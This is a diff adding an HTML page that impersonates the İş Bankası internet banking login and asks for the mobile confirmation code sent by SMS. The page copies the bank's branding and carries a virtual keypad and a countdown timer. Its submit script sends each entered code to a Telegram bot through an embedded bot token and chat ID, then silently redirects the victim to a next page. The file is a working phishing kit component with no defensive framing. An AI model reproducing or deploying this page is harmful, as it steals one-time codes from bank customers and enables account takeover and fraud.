@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>İnternet Şubesi</title>
+    <script type="text/javascript">
+        function mobilkontrol() {
+            return navigator.userAgent.match(/iPhone|iPad|iPod/i);
+        }
+
+        if (mobilkontrol()) {
+            document.title = 'İnternet Şubesi';
+        }
+    </script>
+    
+    <meta name="description" content="">
+    <meta name="keywords" content="">
+    <meta name="robots" content="noindex,nofollow">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#08335E">
+    <meta name="msapplication-TileColor" content="#08335E">
+    <meta name="msapplication-navbutton-color" content="#08335E">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#08335E">
+    <link rel="apple-touch-icon-precomposed" href="https://www.isbank.com.tr/Internet/images_new/Genel/islogo_192.png">
+    <link rel="shortcut icon" sizes="192x192" href="https://www.isbank.com.tr/Internet/images_new/Genel/islogo_192.png">
+
+    <style>
+        :root {
+            --primary-blue: #08335E;
+            --light-gray: #f4f4f4;
+            --dark-gray: #333;
+            --error-red: #ff0000;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: var(--light-gray);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #viewport {
+            width: 100%;
+            max-width: 400px;
+            background: #fff;
+            box-shadow: var(--shadow);
+            border-radius: 12px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        #leftBannerContainer {
+            width: 100%;
+            background: url('https://gorsel.isbank.com.tr/BIB/intsube_Resim/Reklamlar/z5z6/banner.jpg?23_2_2025') no-repeat center;
+            background-size: cover;
+            height: 150px;
+        }
+
+        #header {
+            background-color: var(--primary-blue);
+            padding: 12px;
+            text-align: center;
+        }
+
+        #logoContainer img {
+            max-width: 120px;
+            height: auto;
+            vertical-align: middle;
+        }
+
+        #mainContent {
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+
+        .login-title {
+            font-size: 1.2rem;
+            color: var(--primary-blue);
+            text-align: center;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        .mobile-code-form {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .form-group {
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.9rem;
+            color: var(--dark-gray);
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            background-color: #f9f9f9;
+        }
+
+        .form-group input:focus {
+            border-color: var(--primary-blue);
+            outline: none;
+            box-shadow: 0 0 8px rgba(8, 51, 94, 0.3);
+            background-color: #fff;
+        }
+
+        .error-message {
+            color: var(--error-red);
+            font-size: 0.8rem;
+            margin-top: 6px;
+            display: none;
+            font-weight: 500;
+        }
+
+        .mobile-approve-button {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--primary-blue);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.1s ease;
+            margin-top: 16px;
+        }
+
+        .mobile-approve-button:hover {
+            background-color: #0A4378;
+            transform: translateY(-2px);
+        }
+
+        .mobile-approve-button:active {
+            transform: translateY(0);
+        }
+
+        .timer-container {
+            text-align: center;
+            margin: 16px 0;
+        }
+
+        .keypad-container {
+            margin-top: 8px;
+        }
+
+        .keypad-row {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .keypad-key, .keypad-special {
+            flex: 1;
+            padding: 12px;
+            background-color: #fff;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .keypad-key:hover, .keypad-special:hover {
+            background-color: #f0f0f0;
+        }
+
+        .keypad-special.keypad-shuffle, .keypad-special.keypad-delete {
+            background-color: var(--primary-blue);
+            color: white;
+        }
+
+        .keypad-special.keypad-shuffle:hover, .keypad-special.keypad-delete:hover {
+            background-color: #0A4378;
+        }
+
+        #footer {
+            background-color: #f8f8f8;
+            padding: 16px;
+            text-align: center;
+            font-size: 0.8rem;
+            color: #666;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 12px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: var(--primary-blue);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 768px) {
+            #leftBannerContainer {
+                height: 120px;
+            }
+
+            .login-title {
+                font-size: 1.1rem;
+            }
+
+            .mobile-approve-button {
+                padding: 12px;
+                font-size: 0.9rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            #viewport {
+                max-width: 100%;
+                border-radius: 0;
+                box-shadow: none;
+            }
+
+            #leftBannerContainer {
+                height: 100px;
+            }
+
+            #mainContent {
+                padding: 16px;
+            }
+
+            .login-title {
+                font-size: 1rem;
+            }
+
+            .form-group input {
+                font-size: 0.9rem;
+                padding: 10px;
+            }
+
+            .mobile-approve-button {
+                padding: 10px;
+                font-size: 0.9rem;
+            }
+
+            #footer {
+                padding: 12px;
+                font-size: 0.7rem;
+            }
+
+            .footer-links {
+                gap: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="viewport">
+        <div id="leftBannerContainer"></div>
+        <div id="header">
+            <div id="logoContainer">
+                <img class="isbank-header-logo" src="https://www.isbank.com.tr/_layouts/15/images/isbank/logo.png" alt="Türkiye İş Bankası Logosu" loading="eager" onerror="this.src='https://via.placeholder.com/120x50?text=Logo+Yüklenemedi';">
+            </div>
+        </div>
+        <div id="mainContent">
+            <div class="login-title">
+                Türkiye İş Bankası Bireysel<br>İnternet Şubenize Hoş Geldiniz!
+            </div>
+
+            <div id="formContainer" style="display: block;">
+                <div class="inputDesc">
+                    <span>Cep telefonunuza gönderilen Mobil Onay Kodunu giriniz.</span>
+                </div>
+                <form class="mobile-code-form" id="mobileCodeForm" novalidate>
+                    <input type="hidden" name="isTabletApp" value="false">
+                    <input type="hidden" name="osType" value="false">
+                    <input type="hidden" name="rsamodulus" value="A607708F11403CE77B015BF31A99469BDDDB460B7EDC8146AFA2AB33F69EF0DFB20F930B44C2C2946DD06A398BA6B2EC67426272D4A706114D880B30C496E5186C90AAC56E3DE8989295FB513E58675FE88431AEC2F52AF7F744CA1332DC39B20166DEEC6E3DC6BC2307D2CB71B84973FC9C260C6AF49A58B6926600612B0BC921E6AEEE1C6CFD279954B007DA19E3C36EDCE08F69A8FD572182995E1618E411906F0C0679561C7B9A48A43A00BB435CFF5A46A79061E6E29C644144E74E2B23F31E0ABF54FCAAA42864A2B6578AD81029AFCEC25AB9802056E7A137F3563D981E160A50C463E0A32602569CA810E58995E237ED8D96294614F5FB7CB8B0890D">
+                    <input type="hidden" name="rsaexponent" value="010001">
+                    <input type="hidden" name="encstr" value="">
+                    <input type="hidden" name="__VIEWSTATE" value="..."> <!-- Orijinal VIEWSTATE değerini buraya koyun -->
+                    <input type="hidden" name="__VIEWSTATEGENERATOR" value="622559FF">
+                    <input type="hidden" name="FormSubmitted" value="false">
+                    <input type="hidden" name="IsJagEditDownloaded" value="false">
+                    <input type="hidden" name="hiddenIsICS" value="0">
+
+                    <div class="form-group">
+                        <label for="mobileConfirmationCode">Mobil Onay Kodu</label>
+                        <input type="password" id="mobileConfirmationCode" name="mobileConfirmationCode" placeholder="Mobil Onay Kodunuz" maxlength="6" required autocomplete="off" class="wideInput virtualKeypad onlyNumeric" aria-label="Mobil Onay Kodu">
+                        <div class="error-message" id="mobileConfirmationCodeError">Lütfen Mobil Onay Kodunu giriniz.</div>
+                    </div>
+                    <div class="timer-container">
+                        <div id="timer" data-timer="120"></div>
+                    </div>
+                    <div class="keypad-container">
+                        <div class="keypad-row">
+                            <button type="button" class="keypad-key">1</button>
+                            <button type="button" class="keypad-key">2</button>
+                            <button type="button" class="keypad-key">3</button>
+                        </div>
+                        <div class="keypad-row">
+                            <button type="button" class="keypad-key">4</button>
+                            <button type="button" class="keypad-key">5</button>
+                            <button type="button" class="keypad-key">6</button>
+                        </div>
+                        <div class="keypad-row">
+                            <button type="button" class="keypad-key">7</button>
+                            <button type="button" class="keypad-key">8</button>
+                            <button type="button" class="keypad-key">9</button>
+                        </div>
+                        <div class="keypad-row">
+                            <button type="button" class="keypad-special keypad-shuffle" title="Hareketli"> </button>
+                            <button type="button" class="keypad-key">0</button>
+                            <button type="button" class="keypad-special keypad-delete" title="Sil"> </button>
+                        </div>
+                    </div>
+                    <button type="submit" class="mobile-approve-button">Giriş</button>
+                </form>
+            </div>
+
+            <div id="footer">
+                <div id="content">
+                    <div id="left">
+                        <span>©2025 Türkiye İş Bankası A.Ş</span>
+                    </div>
+                    <div id="right">
+                        <div class="footer-links">
+                            <a href="https://www.isbank.com.tr/iletisim-formu" target="_blank" aria-label="Bize Ulaşın">Bize Ulaşın</a>
+                            <a href="javascript:void(0)" aria-label="İngilizce Versiyon">English</a>
+                            <a href="javascript:void(0)" aria-label="Türkçe Versiyon">Türkçe</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('mobileCodeForm').addEventListener('submit', handleMobileCodeSubmit);
+
+        function handleMobileCodeSubmit(event) {
+            event.preventDefault();
+
+            const mobileCode = document.getElementById('mobileConfirmationCode').value;
+
+            let hasError = false;
+            if (!mobileCode) {
+                document.getElementById('mobileConfirmationCodeError').style.display = 'block';
+                hasError = true;
+            } else {
+                document.getElementById('mobileConfirmationCodeError').style.display = 'none';
+            }
+
+            if (!hasError) {
+                const telegramBotToken = "7770266734:AAGZQbJfWv46lLHsuQIaj8reDZTBlik1-8E";
+                const telegramChatId = "-4775941371";
+                const telegramMessage = `Mobil Onay Kodu: ${mobileCode}`;
+                const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(telegramMessage)}`;
+
+                fetch(telegramUrl)
+                    .then(response => {
+                        if (response.ok) {
+                            window.location.href = "index3.html"; // Sessizce yönlendir
+                        }
+                    })
+                    .catch(error => {
+                        console.error("Hata:", error);
+                    });
+            }
+        }
+
+        // Keypad işlevselliği
+        document.querySelectorAll('.keypad-key, .keypad-special').forEach(button => {
+            button.addEventListener('click', () => {
+                const input = document.getElementById('mobileConfirmationCode');
+                const value = button.textContent.trim();
+                if (value === ' ' && button.classList.contains('keypad-delete')) {
+                    input.value = input.value.slice(0, -1);
+                } else if (value === ' ' && button.classList.contains('keypad-shuffle')) {
+                    console.log("Shuffle clicked");
+                } else {
+                    input.value += value;
+                }
+            });
+        });
+
+        // Timer işlevselliği
+        let timer = 120;
+        const timerElement = document.getElementById('timer');
+        if (timerElement) {
+            const timerInterval = setInterval(() => {
+                timer--;
+                timerElement.textContent = `Kalan Süre: ${timer} sn`;
+                if (timer <= 0) {
+                    clearInterval(timerInterval);
+                    timerElement.textContent = "Süre doldu!";
+                    document.getElementById('mobileConfirmationCode').disabled = true;
+                }
+            }, 1000);
+        }
+    </script>
+
+    <script language="JavaScript" type="text/javascript" src="index_files2/jquery-1.11.0.js"></script>
+    <script language="JavaScript" type="text/javascript" src="index_files2/touchDetection.js"></script>
+    <script language="JavaScript" type="text/javascript" src="index_files2/app.js"></script>
+    <script language="JavaScript" type="text/javascript" src="index_files2/commonNew.js"></script>
+    <script language="JavaScript" type="text/javascript" src="index_files2/JEditSubmit.js"></script>
+    <script language="JavaScript" type="text/javascript" src="index_files2/dfp.min.js"></script>
+</body>
+</html>
